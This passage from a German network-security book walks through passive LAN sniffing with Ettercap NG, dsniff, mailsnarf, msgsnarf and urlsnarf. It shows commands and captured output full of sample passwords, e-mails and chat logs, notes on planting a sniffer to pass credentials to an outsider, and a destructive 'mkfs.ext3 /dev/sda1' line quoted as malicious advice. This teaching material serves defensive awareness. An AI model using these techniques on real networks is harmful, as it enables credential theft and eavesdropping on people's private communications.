ogehrling:\"\":\"\":3C28248827C8117300000000000000000000000000000000:EA4662DE9F 88A9874FE36EEA8FDCB74BCE39B5AD0F911189:75425AC8F9AA9418 DOMAIN: PC1034 (...) DHCP: [00:0C:29:B5:0D:F1] REQUEST 192.168.1.222 DHCP: [192.168.1.1] ACK : 192.168.1.222 255.255.255.0 GW 192.168.1.1 DNS 192.168.1.1 \"discordiawerke.de\" (...) POP : 81.169.145.136:110 -> USER:\n[[email protected]](/cdn-cgi/l/email-protection)\nPASS: schmidt99 DHCP: [00:30:05:33:FF:4B] REQUEST 192.168.1.217 DHCP: [192.168.1.1] ACK : 192.168.1.217 255.255.255.0 GW 192.168.1.1 DNS 192.168.1.1 \"discordiawerke.de\" FTP : 128.176.191.21:21 -> USER: mschmidt PASS: pass$$$$$$WORT HTTP : 195.34.171.39:80 -> USER: buecherwurm8 PASS: buchregal INFO: http://www.tauschticket.de/ (...) IMAP : 192.168.1.55:143 -> USER: \"\n[[email protected]](/cdn-cgi/l/email-protection)\n\" PASS: \"emailemail\" FTP : 128.176.191.21:21 -> USER: mschmidt PASS: FTPPASS!!! POP : 81.169.145.136:110 -> USER:\n[[email protected]](/cdn-cgi/l/email-protection)\nPASS: schmidt99 HTTP : 212.112.252.207:80 -> USER: alterfalter8 PASS: heinemann INFO: http://www.os-community.de/ IMAP : 192.168.1.55:143 -> USER: \"\n[[email protected]](/cdn-cgi/l/email-protection)\n\" PASS: \"emailemail\" POP : 81.169.145.136:110 -> USER:\n[[email protected]](/cdn-cgi/l/email-protection)\nPASS: schmidt99 (...) User requested a CTRL+C... (deprecated, next time use proper shutdown)\nroot@discordia:~#\nEttercap NG bringt zus\u00e4tzlich GUI-basierte Varianten per Ncurses und GTK mit: Die Ncurses-basierte GUI von Ettercap startet mit ettercap -C --silent. Wir w\u00e4hlen jetzt die Option Unified Sniffing. Im Anschluss bestimmen wir die Netzwerkkarte, \u00fcber die wir mit dem uns bislang unbekannten Netzwerk in Verbindung stehen.\n18.3 Passives Mitlesen im LAN: Sniffing\n407\nBild 18.6: Der Start mit Unified sniffing\nUm mit der eigentlichen Netzwerkanalyse zu beginnen, w\u00e4hlen wir unter Start den Men\u00fcpunkt Start Sniffing (oder \u00fcber den Hot-Key (CTRL)-(W)). Ettercap beginnt anschlie\u00dfend mit der Aufzeichnung von Paketen.\nBild 18.7: Abgreifen der Datenpakete\nDer Punkt Connections im Men\u00fc View (oder \u00fcber den Hot-Key (ALT)-(C)) erm\u00f6glicht uns eine Betrachtung des aktuellen Netzwerkgeschehens:\n408\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nBild 18.8: Netzwerkaktivit\u00e4ten live und in Farbe\nIn dieser Maske lassen sich die Verbindungen (entweder aktiv \u2013 also in Echtzeit \u2013 oder bereits beendet) \u00fcber die Cursortasten ausw\u00e4hlen. Per (Return)-Taste k\u00f6nnen wir in den Datenstrom eintauchen und mit (Bild\u00bd)/(Bild\u00bc) innerhalb der mitgeschnittenen Verbindung herumscrollen (entweder live in einer bestehenden Verbindung oder in der Historie einer bereits beendeten Sitzung).\nBild 18.9: Scrollen in der mitgeschnittenen Verbindung\n18.3 Passives Mitlesen im LAN: Sniffing\n409\nMit (STRG)-(Q) gelangt man wieder eine Ebene h\u00f6her (z. B. auf die \u00dcbersicht der Verbindungen), wobei diese Tastenkombination grunds\u00e4tzlich die jeweilige Aktion beendet. Zus\u00e4tzlich erm\u00f6glicht die (TAB)-Taste eine Navigation innerhalb der Men\u00fcs (in Kombination mit (Return) und Cursortasten). Eine Eigenschaft macht Ettercap NG ganz besonders wertvoll: die besondere Vorliebe f\u00fcr Kennw\u00f6rter in Form eines Password-Collectors, der Login-Daten f\u00fcr Telnet, FTP, POP, Rlogin, SSH1, ICQ, SMB, MySQL, HTTP, NNTP, X11, Napster, IRC, RIP, BGP, Socks 5, Imap 4, VNC, Ldap, NFS, Snmp, Half-Life, Quake 3, MSN und Ymsg abgreift. Hierbei weist Ettercap in der Verbindungs\u00fcbersicht mit einem * (Stern) darauf hin, wenn Login-Daten (Username und Kennwort) aus dem Datenstrom herausgefiltert wurden, und zeigt diese unter User messages an. Wenn wir mit (Return) in den protokollierten Datenstrom abtauchen, k\u00f6nnen wir das Kennwort nebst Verbindungseckdaten in Empfang nehmen:\nBild 18.10: Login-Daten beim Sniffen abgreifen\nDie so gewonnenen Daten lassen sich selbstverst\u00e4ndlich auch in ein Logfile schreiben, womit sich stundenlange Netzwerksitzungen mit dem Notebook auf dem Scho\u00df vermeiden lassen: Es gen\u00fcgt, das Ger\u00e4t irgendwo abzustellen, um es Stunden sp\u00e4ter wieder abzuholen. Beim Schreiben des Logfiles ist jedoch darauf zu achten, die Datei im Verzeichnis /tmp anzulegen(z. B. als /tmp/ettercap.log), da es andernfalls zu einer Fehlermeldung kommt.\n410\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nLiebhaber von X-Window werden das GTK-Gewand von Ettercap NG zu sch\u00e4tzen wissen, welches sich nach Eingabe des Kommandos ettercap -G --silent wie folgt pr\u00e4sentiert:\nBild 18.11: Ettercap im Windows-Gewand\nDie Bedienung der GTK-Variante ist im Wesentlichen identisch mit der vom NcursesInterface, nur dass hierbei flexibel mit der Maus gearbeitet werden kann. Nach Wahl der Netzwerkkarte und dem Start des Unified Sniffing \u00fcber Sniff / Unified Sniffing beginnt Ettercap mit der Aufzeichnung des Netzwerkverkehrs:\nBild 18.12: Beim Aufzeichnen des Netzwerkverkehrs\n18.3 Passives Mitlesen im LAN: Sniffing\n411\nEin Blick auf die Verbindungen (Connections im Men\u00fc View) liefert uns eine Maske wie folgt:\nBild 18.13: Welches Kennwort darf\u2019s denn sein?\nMit einem Doppelklick k\u00f6nnen wir Verbindungsinhalte betrachten, und auch hier gilt, dass erfasste Login-Daten mit einem Stern (*) gekennzeichnet werden. Die Verbindungen, deren Login-Daten registriert wurden, sehen beispielsweise so aus:\nBild 18.14: Ettercap NG ermittelt die Login-Daten\nAuf den Punkt gebracht leistet Ettercap NG in einem fremden Netzwerk als erster Sp\u00e4htrupp unsch\u00e4tzbare Dienste, da mit diesem Werkzeug vielf\u00e4ltige Informationen generiert werden k\u00f6nnen. Oftmals reicht es bereits aus, f\u00fcr eine Viertelstunde in das Netz-\n412\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nwerk hineinzuschnuppern, um pikante Details zu erfahren, wie beispielsweise LoginDaten zu unterschiedlichen Diensten. Gelangen auf diese Art und Weise etwa Verbindungsdaten einer unverschl\u00fcsselten Sitzung zu einem UNIX-Server in die H\u00e4nde eines Angreifers, hat dieser quasi schon gewonnen. Zus\u00e4tzlich bietet Ettercap NG als Universalwerkzeug, sowohl f\u00fcr passive als auch f\u00fcr aktive Projekte, weitere M\u00f6glichkeiten, aufschlussreiche Informationen \u00fcber ein Netzwerk zu erfahren. So lassen sich mit verschiedenen Plugins (zu finden unter Plugins / Manage the Plugins oder mit dem Hot-Key (CTRL)-(P)) diverse Aktionen fahren, um beispielsweise Fingerprints von Clients zu ergr\u00fcnden, Clients aus dem Netzwerk zu isolieren oder um den Verbindungstyp festzustellen. Bei Anwendung dieser Plugins handelt es sich nat\u00fcrlich keinesfalls mehr um ein ger\u00e4uschloses Vorgehen: Der Vergleich zum Elefanten im Porzellanladen dr\u00e4ngt sich regelrecht auf, was gerade in dieser ersten Phase g\u00e4nzlich vermieden werden sollte. Dennoch: Die Plugins verm\u00f6gen viel Freude in ein Netzwerk zu bringen und wir legen jedem angehenden Netzwerkforscher die Einarbeitung nahe.\nBild 18.15: Zus\u00e4tzliche M\u00f6glichkeiten \u00fcber Plugins\nEttercap NG liefert uns \u00bbhandfeste\u00ab Daten wie beispielsweise Login-Daten (in diesem Szenario zu einem FTP-Server, einem POP3/IMAP-E-Mail-Konto und zu diversen Websites), User-Agents der in Nutzung stehender Internet-Browser und diverse Benutzernamen. Zus\u00e4tzlich gewinnen wir \u2013 als bislang ausschlie\u00dflich passiv agierender Betrachter \u2013 wertvolle Einblicke in die Funktionsweise des Netzwerks und k\u00f6nnen so Server und verwendete Dienste ausmachen (wie beispielsweise SMB-, Mail- und FTPServer zuordnen und dem Empfang von E-Mails beiwohnen). Es bedarf keines gro\u00dfen Sp\u00fcrsinns, um zu erkennen, welch gef\u00e4hrliches Potenzial sich hier auftut \u2013 insbesondere\n18.3 Passives Mitlesen im LAN: Sniffing\n413\ndann, wenn die textbasierte Version von Ettercap NG, gezielt platziert auf einem \u00fcbernommenen Rechner Ihres Netzwerks, f\u00fcr einige Monate in den Datentransit eintaucht und die gewonnenen Login-Daten tr\u00f6pfchenweise an einen Externen weiterleitet. Denken Sie bitte immer daran, dass das Kapern von Login-Daten kein Selbstzweck ist, sondern im Rahmen dieses Buches dazu motivieren soll, mehr Gedanken in die Netzwerksicherheit zu investieren.\n18.3.4 DSniff-Suite Die DSniff-Suite beinhaltet ein Sortiment wertvoller Programme, die das Herz eines Netzwerkforschers h\u00f6her schlagen lassen. Im Folgenden konzentrieren wir uns auf Sniffing-Komponenten, die in einem fremden Netz \u00fcberaus hilfreich und im Bereich des \u00bbPassive Monitoring\u00ab \u00e4u\u00dferst popul\u00e4r sind. DSniff Das Programm DSniff geh\u00f6rt zu den teuflischsten seiner Art, da dieser Sniffer eine Vielzahl von Protokollen beherrscht und dabei die interessantesten Inhalte auf h\u00f6chst zuvorkommende Art mitschneidet. DSniff arbeitet g\u00e4nzlich passiv: Einmal gestartet, wird die Netzwerkkarte in den bereits angesprochenen Promiscuous Mode versetzt und belauscht fortan den Netzwerkverkehr. Eine einst\u00fcndige Sitzung k\u00f6nnte somit folgendes Ergebnis liefern (leicht gek\u00fcrzt): root@discordia:~# dsniff -i eth0 dsniff: listening on eth0 ----------------02/04/10 12:31:57 tcp 192.168.1.217.1060 -> post.strato.de.110 (pop3) USER\n[[email protected]](/cdn-cgi/l/email-protection)\nPASS schmidt99 ----------------02/04/10 12:48:33 tcp 192.168.1.217.1244 -> anzeigenschaltung.neue-oz.de.21 (ftp) USER discordiawerke PASS 34436ZIZLK76 ----------------02/04/10 13:25:52 tcp 192.168.1.229.1818 -> 192.168.1.211.21 (ftp) USER amueller PASS harleydavidson ----------------02/04/10 14:30:47 tcp 192.168.1.217.1488 -> MERCANT.UNI-MUENSTER.DE.21 (ftp) USER\n[[email protected]](/cdn-cgi/l/email-protection)\nPASS 33434546\n414\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n----------------02/04/10 14:32:12 udp s050a0019.discordiawerke.de.1813 -> p000a4046.sys.discordiawerke.de.161 (snmp) [version 1] public ----------------02/04/10 14:35:32 (pop) USER 0541666666 PASS 124462348 ----------------02/04/10 14:39:12\ntcp 192.168.1.100.2958 -> fwd00.sul.t-online.com.110\ntcp 192.168.1.129:9210 -> 192.168.1.227:5900 (vnc)\nUSER: On display :0 PASS: Server Challenge: 803ddab86c1d8fd69e1d094113ddb1cf Client 3DES: 6219eca12720ee27c7c3397de9f0222e ----------------02/04/10 14:40:32 (pop) USER 054113300765 PASS 124462348\ntcp 192.168.1.100.2958 -> fwd00.sul.t-online.com.110\n^C root@discordia:~#\nDie in diesem Szenario erbeuteten Login-Daten diverser FTP-, POP-, und Challenge/Response-Handshakes von VNC-Sitzungen sind beileibe nicht alles, was DSniff abzugreifen vermag. Der Sniffer versteht sich dar\u00fcber hinaus auf Microsoft SMB, SMTP, SNMP, poppass, NNTP, IMAP, LDAP, Rlogin, RIP, OSPF, PPTP, MS-CHAP, NFS, VRRP, YP/NIS, SOCKS, X11, CVS, IRC, AIM, ICQ, Napster, PostgreSQL, Meeting Maker, Citrix ICA, NAI Sniffer, Oracle SQL*Net, Sybase und auf diverse Microsoft SQLProtokolle. DSniff ist ein Meister im Abgreifen von Login-Daten. Die soeben vorgestellte Sitzung lieferte uns quasi im Vorbeigehen die Login-Daten zu POP3-Postf\u00e4chern und FTPKonten. Wer es beispielsweise nur darauf angelegt hat, E-Mails im Namen anderer zu versenden oder einfach huckepack \u2013 selbstverst\u00e4ndlich ohne Wissen des Opfers \u2013 die gesamte Korrespondenz der erhaschten Postf\u00e4cher mitlesen m\u00f6chte, ist bereits am Ziel. Nicht unerw\u00e4hnt lassen wollen wir, dass der Angreifer in diesem Fall Spuren hinterl\u00e4sst, so z. B. beim Einholen der E-Mails, und weitere Ausbaustufen somit gef\u00e4hrdet. Als wertvoll f\u00fcr das weitere Vorgehen stufen die Autoren im \u00dcbrigen die ergaunerten Challenge/Response-Handshakes von VNC-Verbindungen und die FTP-Zugangsdaten ein.\n18.3 Passives Mitlesen im LAN: Sniffing\n415\nOftmals sind FTP-Konten so eingerichtet, dass es neben FTP auch einen Zugriff auf die Kommandozeile gibt, beispielsweise per SSH. Wir behalten das vorerst im Hinterkopf. Grunds\u00e4tzlich k\u00f6nnen wir festhalten, dass sich der Einsatz von DSniff \u2013 und wenn das Programm auch nur nebenbei in den Datenstrom hineinhorcht, beispielsweise f\u00fcr einen Tag \u2013 in jedem Falle auszahlen kann. Es verwundert immer wieder, wie viele unverschl\u00fcsselte Verbindungen in einem Netzwerk vorkommen. DSniff liefert solche neuralgischen Login-Daten auf dem Silbertablett. MailSnarf Ein \u00e4hnliches Gewicht wie DSniff legt auch MailSnarf in die Waagschale (MailSnarf ist im \u00dcbrigen auch ein Bestandteil der DSniff-Suite). MailSnarf zeichnet alle Nachrichten, die dem SMTP/POP-Datenstrom zu entnehmen sind, komfortabel in einem Berkeley MBox-Format auf. Die MBox-Datei l\u00e4sst sich im Anschluss beispielsweise mit einem Texteditor betrachten (oder mit einem E-Mail-Client wie Mutt und Thunderbird). Der Aufruf von MailSnarf liefert z. B. folgendes Logfile (aus \u00dcbersichtsgr\u00fcnden wieder leicht gek\u00fcrzt): root@discordia:~# mailsnarf -i eth0 mailsnarf: listening on eth0 From\n[[email protected]](/cdn-cgi/l/email-protection)\nThu Feb 4 22:16:28 2010 Received: from 127.0.0.1 (AVG SMTP 9.0.733 [271.1.1/2667]); Thu, 04 Feb 2010 21:15:36 +0100 Message-ID:\n[[email protected]](/cdn-cgi/l/email-protection)\nDate: Thu, 04 Feb 2010 21:15:36 +0100 From:\n[[email protected]](/cdn-cgi/l/email-protection) [[email protected]](/cdn-cgi/l/email-protection)\nUser-Agent: Thunderbird 2.0.0.23 (Windows/20090812) MIME-Version: 1.0 To:\n[[email protected]](/cdn-cgi/l/email-protection)\nSubject: eBay-Rechnung vom Sonntag, 31. Januar 2010 Content-Type: text/plain; charset=windows-1252; format=flowed Content-Transfer-Encoding: 8bit\n-------------------------------------------------------------------------------------------------------------------eBay hat diese Mitteilung an Heiko Langer (hasenpfote8) gesendet. Ihr Vor- und Nachname in dieser Mitteilung sind ein Hinweis darauf, dass die Nachricht tats\u00e4chlich von eBay stammt. Mehr zum Thema: http://pages.ebay.de/help/confidence/name-useridemails.html --------------------------------------------------------------------------------------------------------------------\n416\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n***Dies ist eine automatisch generierte E-Mail. Bitte antworten Sie nicht darauf.*** Rechnungsnummer:\n013499-172583110033\nHeiko Langer Roonstra\u00dfe 10 49078 Osnabrueck Deutschland\nHallo Langer Heiko (etcpasswd), Ihre monatliche Rechnung von eBay f\u00fcr den Zeitraum von 01. Januar 2010 bis 31. Januar 2010 steht jetzt zur Ansicht online bereit.\nF\u00e4lliger Betrag:\n31,18\nSie haben als automatische Zahlungsmethode das Lastschriftverfahren gew\u00e4hlt. Der Rechnungsbetrag wird innerhalb der n\u00e4chsten 5 bis 7 Tage automatisch von Ihrem Bankkonto eingezogen. Der tats\u00e4chlich eingezogene Betrag kann aufgrund k\u00fcrzlicher Zahlungen oder Gutschriften vom Rechnungsbetrag abweichen. Um Einzelheiten Ihrer Rechnung aufzurufen: 1. Gehen Sie zu http://www.ebay.de und klicken Sie auf Mein eBay, das oben auf den meisten eBay-Seiten zu finden ist. Sie m\u00fcssen sich dazu einloggen. 2. Klicken Sie auf den Link Verk\u00e4uferkonto (links auf der Seite, unterhalb von Mein Mitgliedskonto). 3. Klicken Sie auf den Link \"Rechnungen anzeigen\" und w\u00e4hlen Sie dann aus den Pull-down-Men\u00fc die gew\u00fcnschte Rechnung. Hinweis: eBay fragt niemals per E-Mail nach vertraulichen oder pers\u00f6nlichen Daten (z. B. Passwort, Kreditkarte, Kontonummer). Vielen Dank, dass Sie eBay nutzen. Mit freundlichen Gr\u00fc\u00dfen, eBay\neBay Europe S.\u00e0 r.l. 22-24 Boulevard Royal L-2249 Luxemburg\n18.3 Passives Mitlesen im LAN: Sniffing\n417\nSoci\u00e9t\u00e9 \u00e0 responsabilit\u00e9 limit\u00e9e, Capital social: EUR 12.500 Num\u00e9ro de TVA: LU 21416127 Num\u00e9ro de soci\u00e9t\u00e9: R.C.S. Luxemburg B.120781 Autorisation d'\u00e9tablissement: 114463\nMehr zum Thema, wie Sie sich vor gef\u00e4lschten E-Mails sch\u00fctzen k\u00f6nnen, finden Sie unter ebay.de/education/spooftutorial eBay hat Ihnen diese E-Mail gesendet unter\n[[email protected]](/cdn-cgi/l/email-protection)\n\u00fcber Ihr Mitgliedskonto angemeldet am ebay.de. eBay sendet Ihnen regelm\u00e4\u00dfig die erforderlichen Benachrichtigungen f\u00fcr die Website und Ihre Transaktionen. Lesen Sie bitte unsere Datenschutzerkl\u00e4rung unter http://pages.ebay.de/help/policies/privacy-policy.html und Allgemeine Gesch\u00e4ftsbedingungen (AGB) unter http://pages.ebay.de/help/policies/user-agreement.html, wenn Sie weiter Fragen haben sollten. Diese E-Mail haben Sie von der eBay Europe S.\u00e0 r.l. erhalten, die \u00fcber Ihre Tochtergesellschaften den eBay-Service bereitstellt. Wenn sich Ihr Wohnsitz nicht innerhalb der Europ\u00e4ischen Union befindet, lesen Sie bitte die Information zu Ihrem Vertragspartner in den Allgemeinen Gesch\u00e4ftsbedingungen (AGB). Copyright \u00a9 2010 eBay, Inc. Alle Rechte vorbehalten. Die genannten Marken geh\u00f6ren den jeweiligen Eigent\u00fcmern. eBay und das eBay-Logo sind eingetragene Marken bzw. Marken von eBay Inc. eBay Impressum unter http://pages.ebay.de/aboutebay/contact.html. Reference #: 10229.623.77 From mailsnarf Thu Feb 4 22:38:40 2010 X-Envelope-From:\n[[email protected]](/cdn-cgi/l/email-protection)\nX-Envelope-To:\n[[email protected]](/cdn-cgi/l/email-protection)\nX-Delivery-Time: 1265315613 X-UID: 9732 Return-Path:\n[[email protected]](/cdn-cgi/l/email-protection)\nX-RZG-CLASS-ID: mi\n418\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nReceived: from mailer11.agnitas.de ([213.203.225.130]) by mailin.webmailer.de (zeb mi15) (RZmta 22.6) with ESMTP id z050d9m14K0Zyo for ; Thu, 4 Feb 2010 21:33:33 +0100 (MET) Received: by mailer11.agnitas.de for ; Thu, 4 Feb 2010 20:01:13 GMT Message-ID:\n[[email protected]](/cdn-cgi/l/email-protection)\nDate: Thu, 4 Feb 2010 20:01:13 GMT From: Media Markt Newsletter\n[[email protected]](/cdn-cgi/l/email-protection)\nTo:\n[[email protected]](/cdn-cgi/l/email-protection)\nSubject: =?ISO-88591?Q?Agenda_Pr=E4mie:_Bis_zu_200_Euro_Geschenkkarte_beim_Kauf_eines_Neuger=E 4tes._?= X-Mailer: Agnitas EMM 6.3 MIME-Version: 1.0 Content-Type: multipart/alternative; boundary=\"-==AGNITASOUTER164240059B2900FE42==\" This is a multi-part message in MIME format. ---==AGNITASOUTER164240029B2900FE42== Content-Type: text/plain; charset=\"ISO-8859-1\" Content-Transfer-Encoding: quoted-printable Guten Tag! Die Media Markt Agenda Pr=E4mie: Bis zu 200 Euro Geschenkkarte beim Kauf eines Neuger=E4tes! Alle Infos: http://news.mediamarkt.de/r.html?uid=3D7w.1e82.rc4j.4sshh.sg3fq98wlt ------------------------------------------------------------------Sie haben Fragen zu Produkten oder einem Media Markt in Ihrer N=E4he? Wenden Sie sich einfach per E-Mail an unseren Kundenservice:\n[[email protected]](/cdn-cgi/l/email-protection)\nFalls Sie diesen Newsletter k=FCnftig nicht mehr erhalten m=F6chten, k=F6nnen Sie sich hier selbstverst=E4ndlich ganz einfach wieder abmelden: http://news.mediamarkt.de/r.html?uid=3D7w.1e83.rc4j.4sshg.xpjzcp9olh\n18.3 Passives Mitlesen im LAN: Sniffing\n419\nImpressum: http://news.mediamarkt.de/r.html?uid=3D9w.1e82.rc4j.4sshk.7u2adthr4g ---==AGNITASOUTER164240059B2900FE42== Content-Type: text/html; charset=\"ISO-8859-1\" Content-Transfer-Encoding: quoted-printable Media Markt Newsletter (. ..) ^C root@discordia:~#\nMit MailSnarf lassen sich problemlos E-Mails aus dem Netzwerkverkehr fischen. Das Elegante hierbei ist im Vergleich zur soeben angedachten Abholung der Mails mittels mitgeschnittener POP3-Nutzerdaten, dass MailSnarf unauff\u00e4llig arbeitet und keine Spuren hinterl\u00e4sst. MsgSnarf Mit MsgSnarf fokussieren wir uns auf das Mitlesen von Sitzungen diverser Chat- und Instant-Messaging-Programme wie IRC, AOL Instant Messenger, ICQ 2000, MSN Messenger und dem Yahoo Messenger. Hier der Gespr\u00e4chsverlauf einer erfassten IRCSitzung:\n420\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nroot@discordia:~# msgsnarf -i eth0 msgsnarf: listening on eth0 Feb 4 12:46:48 IRC *** AGENTBLUEZ (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner Feb 4 12:46:49 IRC ClanBot-04 > AGENTBLUEZ: 12Rules for Our channel are Respect Users & Operators , No Discussion Over Politics, No Religious Discussion, No Discussion Over Hacking & Cracking, No Harrasement, No Flooding, No Spamming, and Most Important No Advertisement. Feb 4 12:46:49 IRC ClanBot-04 > AGENTBLUEZ: 4Welcome To #Beginner If you think you have been treated unfair or kicked & banned for wrong reason then just leave us an email (With logs) at\n[[email protected]](/cdn-cgi/l/email-protection)\nand we will get back to you ASAP......Team #beginner Feb 4 12:47:11 IRC *** AGENTBLUEZ (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #wirtschaft Feb 4 12:47:18 IRC *** AGENTBLUEZ (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #wow Feb 4 12:48:43 IRC *** Signoff: Dezzimal (Quit) Feb 4 12:48:50 IRC ernie > AGENTBLUEZ: hi there Feb 4 12:49:00 IRC ernie > AGENTBLUEZ: how are you doing today? Feb 4 12:49:26 IRC ernie > AGENTBLUEZ: hello Feb 4 12:49:30 IRC ernie > AGENTBLUEZ: do you wanna chat? Feb 4 12:49:52 IRC ernie > AGENTBLUEZ: 14agentbluez Feb 4 12:50:15 IRC AGENTBLUEZ > ernie: nope. thanks. no time Feb 4 12:50:33 IRC *** AGENTBLUEZ (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #bondage Feb 4 12:50:50 IRC ernie > AGENTBLUEZ: i c Feb 4 12:51:08 IRC *** AGENTBLUEZ (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #TeenZone Feb 4 12:51:09 IRC *** OpServ (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #TeenZone Feb 4 12:52:53 IRC *** tuesday121 (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner Feb 4 12:53:05 IRC AbjectSOB > AGENTBLUEZ: VERSION Feb 4 12:58:40 IRC *** Signoff: tuesday121 (Quit) Feb 4 12:58:51 IRC *** Male38m (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner Feb 4 13:01:59 IRC *** So (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner Feb 4 13:03:47 IRC *** irum (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner Feb 4 13:03:55 IRC mustafaaa > AGENTBLUEZ: hi Feb 4 13:05:50 IRC *** irum (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner Feb 4 13:07:40 IRC *** Signoff: irum (Quit) Feb 4 13:08:14 IRC *** Signoff: mustafaaa (Quit) Feb 4 13:08:36 IRC *** sam (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner\n18.3 Passives Mitlesen im LAN: Sniffing\n421\nFeb 4 13:11:00 IRC *** Signoff: Sim (Ping timeout) Feb 4 13:11:09 IRC *** casper (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner Feb 4 13:11:17 IRC *** goodman (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner Feb 4 13:11:40 IRC *** Signoff: sam (Quit) Feb 4 13:14:12 IRC *** Gabriel (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner Feb 4 13:14:30 IRC *** carlosivan_25 (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner Feb 4 13:14:39 IRC carlosivan_25 > #Beginner: holas Feb 4 13:14:48 IRC *** budibel (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #Beginner Feb 4 13:15:20 IRC casper > #Beginner: wat? Feb 4 13:15:22 IRC *** Dezzimal (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #wow Feb 4 13:20:28 IRC *** Signoff: casper (Quit) Feb 4 13:23:45 IRC *** Signoff: Arman (Quit) Feb 4 13:24:41 IRC *** AGENTBLUEZ (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #CounterStrike Feb 4 13:24:53 IRC *** AGENTBLUEZ (\n[[email protected]](/cdn-cgi/l/email-protection)\n) has joined channel #counter-strike Feb 4 13:24:59 IRC AGENTBLUEZ > #counter-strike: !note ^C root@discordia:~#\nMsgSnarf liefert uns eine mit hoher Wahrscheinlichkeit w\u00e4hrend der Arbeitszeit untersagte und m\u00f6glicherweise delikate Chat-Sitzung, an deren Ver\u00f6ffentlichung der Benutzer AGENTBLUEZ nicht sonderlich interessiert sein d\u00fcrfte. Ein Krimineller k\u00f6nnte diese Vorlieben f\u00fcr eine Erpressung missbrauchen. Eine nicht zu untersch\u00e4tzende Gefahr bei der Suche nach L\u00f6sungsvorschl\u00e4gen durch IRC und Newsgroups besteht darin, dass hierbei oftmals verwertbare Informationen \u00fcber sicherheitsrelevante Schw\u00e4chen kundgetan werden. Wer beim Chat oder in Newsgroups unter Verwendung seiner offiziellen Kontaktdaten \u00fcber Herausforderungen bei der Konfiguration von Routern berichtet und dabei erw\u00e4hnt, dass derzeit s\u00e4mtliche Ger\u00e4tschaften mit Default-Kennw\u00f6rtern betrieben werden, braucht sich \u00fcber ein gesteigertes Interesse seitens potenzieller Eindringe nicht zu wundern. Ein hohes Risiko stellen auch \u00bbhilfsbereite\u00ab Leute aus dem Chat dar, die dem frustrierten Administrator angeblich wertvolle Tipps zur Konfiguration eines Systems liefern, diesen durch Social Engineering jedoch dazu bringen, sich selbst ein Bein zu stellen. Beispiel: Frage von ALICE: \u00bbWie pr\u00fcfe ich das Filesystem meiner Partition /dev/sda1 auf Dateisystemfehler?\u00ab \u2013 Antwort von EVE: \u00bbDas geht einfach. Mach mal mkfs.ext3 /dev/sda1\u00ab \u2013 AUA!\n422\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nURLSnarf URLSnarf, ein weiterer Bestandteil der DSniff-Suite, erfasst aufgerufene URLs des HTTP-Verkehrs und erm\u00f6glicht somit dem Netzwerkforscher eine l\u00fcckenlose Kontrolle der besuchten Webseiten. URLSnarf bereitet die erfassten Daten im CLF-Format auf, welches nachtr\u00e4glich mittels Logfile-Analyzer-Programmen verarbeiten werden kann (z. B. \u00fcber den Webalizer). Die durch URLSnarf gewonnenen Logfiles sehen aus wie folgt: root@discordia:~# urlsnarf -i eth0 192.168.1.217 \u2013 - [04/Feb/2010:11:50:03 +0100] \"GET http://avgtechnologies.112.2o7.net/b/ss/avgcorporatepublicww/1/H.17/s896381 35944740?AQB=1&ndh=1&t=4/1/2010%2020%3A49%3A39%204%20-60&ce=UTF8&ns=avgtechnologies&pageName=http%3A//static.avg.com/programupdate/de.perform-program-update.html&g=http%3A//static.avg.com/programupdate/de.perform-programupdate.html&server=static.avg.com&events=event23&c6=DE&v6=DE&c8=DEDE&c14=DE&c15=DE-DE&v22=http%3A//static.avg.com/program-update/de.performprogram-update.html&v23=DE&c24=Direct%20Load&v24=DE-DE&v30=popupcampaign_perform-programupdate_de&s=1024x768&c=32&j=1.5&v=Y&k=Y&bw=604&bh=347&ct=lan&hp=N&AQE=1 HTTP/1.1\" \u2013 - \"http://static.avg.com/program-update/de.perform-programupdate.html\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" 192.168.1.229 \u2013 - [04/Feb/2010:11:50:08 +0100] \"GET http://intranet.discordiawerke.de/ HTTP/1.1\" \u2013 - \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.1)\" 192.168.1.10 \u2013 - [04/Feb/2010:11:50:13 +0100] \"GET http://www.heise.de/ HTTP/1.1\" \u2013 - \"-\" \" Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" 192.168.1.10 \u2013 - [04/Feb/2010:11:50:13 +0100] \"GET http://www.heise.de/newsticker/foren/S-Regiert-sein-das-heisst/forum141674/msg-15333344/read/ HTTP/1.1\" \u2013 - \"-\" \" Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" 192.168.1.225 \u2013 - 